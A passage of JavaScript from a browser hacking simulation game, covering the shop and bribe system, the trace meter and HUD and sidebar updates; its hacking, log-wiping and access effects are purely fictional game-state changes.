      text: `  ${item.id.padEnd(20)} ${String(item.price).padEnd(6)} CRYPTO  ${owned ? '[INSTALLED]' : !hasBase ? `[need ${item.requires}]` : ''}`,
    });
    if (!owned) lines.push({ type: 'dim', text: `    ${item.desc}  →  shop buy ${item.id}` });
  }
  await printLines(lines, 16);
}

async function shopListBribes() {
  const lines = [
    { type: 'sys',  text: '[ BRIBE CONTACTS ]' },
    { type: 'dim',  text: `  Wallet: ${G.crypto} CRYPTO` },
    { type: 'info', text: '' },
  ];
  for (const item of SHOP.bribes) {
    const canAfford = G.crypto >= item.price;
    lines.push({
      type: canAfford ? 'ok' : 'warn',
      text: `  ${item.id.padEnd(20)} ${String(item.price).padEnd(6)} CRYPTO`,
    });
    lines.push({ type: 'dim', text: `    ${item.desc}  →  shop buy ${item.id}` });
  }
  await printLines(lines, 16);
}

async function shopBuy(id) {
  if (!id) { printLine('Usage: shop buy <id>', 'out-err'); return; }

  // ── Tools ──
  const toolItem = SHOP.tools.find(t => t.id === id);
  if (toolItem) {
    if (G.tools.includes(id)) { printLine(`[*] You already own ${toolItem.name}.`, 'out-dim'); return; }
    if (G.crypto < toolItem.price) { printLine(`[!] Insufficient funds. Need ${toolItem.price} CRYPTO, have ${G.crypto}.`, 'out-err'); return; }
    G.crypto -= toolItem.price;
    G.tools.push(id);
    await saveState(); updateSidebar(); updateHUD();
    printLine(`[+] Purchased: ${toolItem.name}`, 'out-ok');
    printLine(`    ${toolItem.desc}`, 'out-dim');
    return;
  }

  // ── Upgrades ──
  const upItem = SHOP.upgrades.find(u => u.id === id);
  if (upItem) {
    if (G.toolUpgrades.includes(id)) { printLine(`[*] ${upItem.name} is already installed.`, 'out-dim'); return; }
    if (!G.tools.includes(upItem.requires)) { printLine(`[!] Requires ${upItem.requires} first.`, 'out-err'); return; }
    if (G.crypto < upItem.price) { printLine(`[!] Insufficient funds. Need ${upItem.price} CRYPTO, have ${G.crypto}.`, 'out-err'); return; }
    G.crypto -= upItem.price;
    G.toolUpgrades.push(id);
    await saveState(); updateSidebar(); updateHUD();
    printLine(`[+] Installed: ${upItem.name}`, 'out-ok');
    printLine(`    ${upItem.desc}`, 'out-dim');
    return;
  }

  // ── Bribes ──
  const brItem = SHOP.bribes.find(b => b.id === id);
  if (brItem) {
    if (G.crypto < brItem.price) { printLine(`[!] Insufficient funds. Need ${brItem.price} CRYPTO, have ${G.crypto}.`, 'out-err'); return; }
    G.crypto -= brItem.price;
    printLine(`[*] Contacting ${brItem.name}...`, 'out-dim');
    await delay(800);
    await applyBribe(id, brItem);
    return;
  }

  printLine(`[!] Unknown item: ${id}  — type "shop" to browse.`, 'out-err');
}

async function applyBribe(id, item) {
  if (id === 'ghost_protocol') {
    G.trace = 0;
    await saveState(); updateHUD();
    printLine(`[+] ${item.name}: Trace flushed to 0.`, 'out-ok');
  } else if (id === 'fixer') {
    const reduced = Math.min(20, G.notoriety);
    G.notoriety = Math.max(0, G.notoriety - 20);
    await saveState(); updateHUD(); updateSidebar();
    printLine(`[+] ${item.name}: Heat reduced by ${reduced}. Now at ${G.notoriety}%.`, 'out-ok');
  } else if (id === 'insider') {
    if (!G.connected) {
      printLine('[!] Not connected to any target — connect first, then bribe the insider.', 'out-err');
      G.crypto += item.price; // refund
      return;
    }
    if (G.connected.authed) { printLine('[*] Already authenticated on this connection.', 'out-dim'); G.crypto += item.price; return; }
    G.connected.authed = true;
    updateSidebar();
    await saveState();
    printLine(`[+] ${item.name}: Admin bribed. Shell access granted on ${G.connected.ip}:${G.connected.port}.`, 'out-ok');
  } else if (id === 'intel_drop') {
    const target = getActiveTarget();
    if (!target) {
      printLine('[!] No active target to get intel on.', 'out-err');
      G.crypto += item.price; // refund
      return;
    }
    printLine(`[+] ${item.name}: Anonymous tip received.`, 'out-ok');
    printLine(`[*] Files on ${target.hostname}:`, 'out-dim');
    for (const [name, content] of Object.entries(target.files)) {
      await delay(35);
      printLine(`    ${name.padEnd(32)} ${(content.length * 1.1).toFixed(0)} bytes`, 'out-info');
    }
    await saveState();
  } else if (id === 'cleaner') {
    if (!G.connected?.authed) {
      printLine('[!] Must be authenticated on a target to use The Cleaner.', 'out-err');
      G.crypto += item.price; // refund
      return;
    }
    const ip = G.connected.ip;
    if (G.wipedHosts.includes(ip)) { printLine('[*] Logs already clean on this host.', 'out-dim'); G.crypto += item.price; return; }
    printLine(`[+] ${item.name}: Professional log sanitiser dispatched.`, 'out-ok');
    await delay(800);
    G.wipedHosts.push(ip);
    await saveState();
    printLine(`[+] All auth logs wiped on ${ip}.`, 'out-ok');
  } else if (id === 'mole') {
    const target = getActiveTarget();
    if (!target) {
      printLine('[!] No active target for The Mole.', 'out-err');
      G.crypto += item.price; // refund
      return;
    }
    printLine(`[+] ${item.name}: Insider contact activated.`, 'out-ok');
    await delay(600);
    printLine(`[*] Hidden intel on ${target.hostname}:`, 'out-dim');
    for (const [port, info] of Object.entries(target.ports)) {
      await delay(50);
      printLine(`    Port ${String(port).padEnd(6)} ${info.service.padEnd(8)} ${info.hidden ? '[STEALTH] ' : '[OPEN]    '} ${info.banner}`, 'out-info');
    }
    if (target.captureFiles) {
      for (const fname of Object.keys(target.captureFiles)) {
        printLine(`    [HINT] captureFile: ${fname} — use "sniff"`, 'out-dim');
      }
    }
    if (target.fuzzFiles) {
      for (const fname of Object.keys(target.fuzzFiles)) {
        printLine(`    [HINT] hiddenFile: ${fname} — use "fuzz"`, 'out-dim');
      }
    }
    await saveState();
  }
}

async function cmdBribe(type) {
  const aliases = {
    trace:    'ghost_protocol',
    ghost:    'ghost_protocol',
    flush:    'ghost_protocol',
    heat:     'fixer',
    fixer:    'fixer',
    admin:    'insider',
    insider:  'insider',
    intel:    'intel_drop',
    files:    'intel_drop',
    info:     'intel_drop',
    cleaner:  'cleaner',
    logs:     'cleaner',
    wipe:     'cleaner',
    mole:     'mole',
    ports:    'mole',
    recon:    'mole',
  };
  const id = aliases[type?.toLowerCase()];
  if (!id) {
    await printLines([
      { type: 'sys',  text: '[ BRIBE SHORTCUTS ]' },
      { type: 'info', text: '  bribe trace    — flush current trace to 0 (120 CRYPTO)' },
      { type: 'info', text: '  bribe fixer    — reduce heat by 20 (250 CRYPTO)' },
      { type: 'info', text: '  bribe insider  — auto-auth active connection (200 CRYPTO)' },
      { type: 'info', text: '  bribe intel    — reveal all files on current target (150 CRYPTO)' },
      { type: 'info', text: '  bribe cleaner  — wipe logs on current host (350 CRYPTO)' },
      { type: 'info', text: '  bribe mole     — reveal all ports and hidden files (280 CRYPTO)' },
      { type: 'dim',  text: '  Use "shop bribes" for full details.' },
    ], 18);
    return;
  }
  await shopBuy(id);
}

// ── Trace ─────────────────────────────────────────────────────

function addTrace(amount) {
  let effective = amount;
  if (G.tools.includes('vpn_tunnel')) {
    effective = Math.round(effective * 0.50);
  } else if (G.tools.includes('proxy_basic')) {
    effective = G.toolUpgrades.includes('proxy_chain')
      ? Math.round(amount * 0.40)
      : Math.round(amount * 0.65);
  }
  G.trace = Math.min(100, G.trace + effective);
  updateHUD();
  if (G.trace >= 100) triggerTraceBurn();
}

async function triggerTraceBurn() {
  setBusy(true);
  await printLines([
    { type: 'err', text: '' },
    { type: 'err', text: '[!!!] TRACE COMPLETE — CONNECTION TERMINATED' },
    { type: 'err', text: '[!!!] Security team alerted. Pulling out...' },
  ], 100);
  G.connected = null; G.trace = 0;
  G.notoriety = Math.min(100, G.notoriety + 5);
  G.downloadedFiles = [];
  await saveState(); updateHUD(); updateSidebar();
  await delay(1000);
  printLine('[*] Connection dropped. Retry your approach.', 'out-warn');
  if (G.freeMode) printLine('[*] Type "quest" to see your current contract.', 'out-dim');
  setBusy(false);
}

// ── HUD & Sidebar ─────────────────────────────────────────────

function updateHUD() {
  const levelEl = document.getElementById('hdr-level');
  if (G.freeMode) {
    levelEl.textContent = 'Free Mode';
  } else {
    const m = MISSIONS[G.missionIdx];
    levelEl.textContent = m
      ? `Act ${m.act} · Mission ${G.missionIdx + 1} / ${MISSIONS.length}`
      : 'Free Mode';
  }

  const tf = document.getElementById('trace-fill');
  tf.style.width  = G.trace + '%';
  tf.className    = `meter-fill trace${G.trace >= 70 ? ' high' : ''}`;
  document.getElementById('trace-pct').textContent = Math.round(G.trace) + '%';

  document.getElementById('notoriety-fill').style.width = G.notoriety + '%';
  document.getElementById('notoriety-pct').textContent  = G.notoriety + '%';
}

function updateSidebar() {
  const quest   = G.freeMode ? G.currentQuest : null;
  const mission = G.freeMode ? null : MISSIONS[G.missionIdx];
  const conn    = G.connected;

  document.getElementById('sb-mission-title').textContent =
    G.freeMode
      ? (quest ? quest.title : 'Free Mode')
      : (mission?.title ?? '—');

  document.getElementById('sb-objective').textContent =
    G.freeMode
      ? (quest ? quest.objective : 'Type "quest" to start')
      : (mission?.objective ?? '—');

  document.getElementById('sb-crypto').textContent     = G.crypto;
  document.getElementById('sb-notoriety').textContent  = G.notoriety;
  document.getElementById('sb-connection').textContent =
    conn ? `${conn.ip}:${conn.port} (${conn.authed ? '✓ authed' : 'no auth'})` : 'Offline';
  document.getElementById('sb-tools').innerHTML =
    G.tools.map(t => `<span class="tool-chip">${TOOLS[t]?.name ?? t}</span>`).join('');
  const modsEl = document.getElementById('sb-mods');
  const modsSection = document.getElementById('sb-mods-section');
  if (G.toolUpgrades.length) {
    modsEl.innerHTML = G.toolUpgrades
      .map(u => SHOP.upgrades.find(x => x.id === u))
      .filter(Boolean)
      .map(u => `<span class="tool-chip" style="border-color:#6c63ff;color:#6c63ff">${u.name}</span>`)
      .join('');
    modsSection.style.display = '';
  } else {
    modsSection.style.display = 'none';
  }
}

init();
